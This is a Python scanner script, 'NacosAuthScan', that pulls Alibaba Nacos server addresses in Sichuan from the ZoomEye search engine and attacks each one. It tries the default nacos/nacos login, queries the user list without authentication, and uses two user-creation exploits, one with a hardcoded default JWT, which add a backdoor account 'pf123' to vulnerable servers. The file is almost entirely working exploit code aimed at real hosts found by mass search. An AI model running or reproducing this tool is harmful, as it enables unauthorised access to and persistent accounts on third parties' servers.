# -*- coding: utf-8 -*-
# @Time    : 2023/7/21 16:49
# @Author  : PFinal南丞 <lampxiezi@163.com
# @File    : scan.py
# @Software: PyCharm
import threading

import fire
import requests
import urllib3
import zoomeye.sdk as zoomeye
from colorama import Fore

urllib3.disable_warnings()

yellow = '\033[01;33m'
white = '\033[01;37m'
green = '\033[01;32m'
blue = '\033[01;34m'
red = '\033[1;31m'
end = '\033[0m'

version = 'v0.1'
message = white + '{' + red + version + ' #dev' + white + '}'

nacos_scan_banner = f"""
{yellow} NacosAuthScan is a tool to Scan for unauthorized {yellow}

  _   _                                   _   _      _____                 
 | \ | |                       /\        | | | |    / ____|                 {message}{green}
 |  \| | __ _  ___ ___  ___   /  \  _   _| |_| |__ | (___   ___ __ _ _ __   {blue}
 | . ` |/ _` |/ __/ _ \/ __| / /\ \| | | | __| '_ \ \___ \ / __/ _` | '_ \  {blue}
 | |\  | (_| | (_| (_) \__ \/ ____ \ |_| | |_| | | |____) | (_| (_| | | | | {green}
 |_| \_|\__,_|\___\___/|___/_/    \_\__,_|\__|_| |_|_____/ \___\__,_|_| |_| {white}PFinal南丞{white}
                                                                                                      
{red}NacosAuthScan is under development, please update before each use!{end}
"""
zm = zoomeye.ZoomEye(api_key="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")
data_queue = []

head = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}


def poc1(url):
    if url.endswith("/"):
        path = "nacos/v1/auth/users/login"
    else:
        path = "/nacos/v1/auth/users/login"
    data = {
        "username": "nacos",
        "password": "nacos"
    }
    checkpoc1 = requests.post(url=url + path, headers=head, data=data, verify=False)
    if checkpoc1.status_code == 200:
        print(Fore.GREEN + f"[+] {url} 存在默认口令nacos\n")
    else:
        print(Fore.RED + f"[-] {url}  不存在默认口令\n")


def poc2(url):
    if url.endswith("/"):
        path = "nacos/v1/auth/users?pageNo=1&pageSize=5"
    else:
        path = "/nacos/v1/auth/users?pageNo=1&pageSize=5"
    checkpoc2 = requests.get(url=url + path, headers=head, verify=False)
    if "username" in checkpoc2.text:
        print(Fore.GREEN + f"[+] 存在未授权访问漏洞,你可访问 {url + path} 查看详细信息\n")
    else:
        print(Fore.RED + f"[-] {url} 不存在未授权访问漏洞\n")


def poc3(url):
    if url.endswith("/"):
        path = "nacos/v1/auth/users"
    else:
        path = "/nacos/v1/auth/users"
    data = {
        "username": "pf123",
        "password": "pf123"
    }
    checkpoc3 = requests.post(url=url + path, headers=head, data=data, verify=False)
    if "create user ok" in checkpoc3.text:
        print(Fore.GREEN + f"[+] {url} 存在任意用户添加漏洞 【用户:pf123 密码为：pf123】 \n")
    else:
        print(Fore.RED + f"[-] {url} 不存在任意用户添加漏洞\n")


def poc4(url):
    if url.endswith("/"):
        path = "nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3OTA4NTg3NX0.WT8N_acMlow8KTHusMacfvr84W4osgSdtyHu9p49tvc"
    else:
        path = "/nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3OTA4NTg3NX0.WT8N_acMlow8KTHusMacfvr84W4osgSdtyHu9p49tvc"
    data = {
        "username": "pf123",
        "password": "pf123"
    }
    checkpoc4 = requests.post(url=url + path, headers=head, data=data, verify=False)
    if "create user ok" in checkpoc4.text:
        print(Fore.GREEN + f"[+] {url} 存在任意用户添加漏洞 【用户:pf123 密码为：pf123】添加成功\n")
    else:
        print(Fore.RED + f"[-] {url} 不存在默认JWT任意用户添加漏洞\n")


def send_request(ip_info):
    """ send_request"""
    detail_url = ip_info.get('ip') + ':' + str(ip_info.get('port'))
    if ip_info.get('port') == '443':
        detail_url = 'https://' + detail_url
    else:
        detail_url = 'http://' + detail_url
    poc1(detail_url)
    poc2(detail_url)
    poc3(detail_url)
    poc4(detail_url)


class ZScan:
    """ 获取 """

    def __init__(self):
        self.queue = None

    @staticmethod
    def get_goal_from_zoom() -> None:
        """ get_goal_from_zoom """
        page = 1
        try:
            zm.dork_search('app:"Alibaba Nacos" +country:"CN" +subdivisions:"四川"', page)
            for ip in zm.dork_filter("ip,port"):
                data_queue.append({'ip': str(ip[0]), 'port': str(ip[1])})  # 将采集的结果放入data_queue中
        except Exception as e:
            print(e)

    @staticmethod
    def scan_goal_from_queue():
        """ scan_goal_from_queue """
        threads = []
        for ip_list in data_queue:
            t = threading.Thread(target=send_request, args=(ip_list,))
            threads.append(t)
            t.start()

        # 等待所有线程完成
        for t in threads:
            t.join()


def run_scan(action='-z', **kwargs):
    """run scan action"""
    if action == '-z':
        scan = ZScan()
        scan.get_goal_from_zoom()
        scan.scan_goal_from_queue()


if __name__ == '__main__':
    print(nacos_scan_banner)
    fire.Fire(run_scan)
